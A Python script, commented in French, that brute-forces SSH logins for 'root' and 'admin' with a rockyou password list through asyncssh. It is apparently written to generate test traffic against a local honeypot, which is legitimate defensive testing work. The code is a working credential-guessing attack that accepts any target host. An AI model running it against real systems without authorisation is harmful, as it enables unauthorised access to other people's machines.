"""Fallback bruteforce SSH 100%% Python (si Hydra absent).

Utilise asyncssh pour tenter une liste de credentials et generer du trafic
de validation contre le honeypot. Ne necessite aucun outil externe.
"""

from __future__ import annotations

import asyncio
import sys
from pathlib import Path

try:
    import asyncssh
except ImportError:
    print("[!] asyncssh requis: pip install asyncssh")
    sys.exit(1)

USERS = ["root", "admin"]


async def attempt(host: str, port: int, user: str, password: str) -> None:
    try:
        async with asyncssh.connect(host, port=port, username=user, password=password,
                                    known_hosts=None, login_timeout=5) as conn:
            await conn.run("whoami", check=False)
    except Exception:  # noqa: BLE001 - echec d'auth attendu
        pass


async def main() -> None:
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 2222
    wordlist = Path(sys.argv[3]) if len(sys.argv) > 3 else Path("datasets/rockyou-top1000.txt")
    passwords = wordlist.read_text(encoding="utf-8", errors="ignore").splitlines()
    count = 0
    sem = asyncio.Semaphore(20)

    async def guarded(u: str, p: str) -> None:
        async with sem:
            await attempt(host, port, u, p)

    tasks = []
    for user in USERS:
        for pwd in passwords:
            pwd = pwd.strip()
            if not pwd:
                continue
            tasks.append(guarded(user, pwd))
            count += 1
    print(f"[*] {count} tentatives SSH vers {host}:{port}...")
    await asyncio.gather(*tasks)
    print("[+] Bruteforce termine.")


if __name__ == "__main__":
    asyncio.run(main())
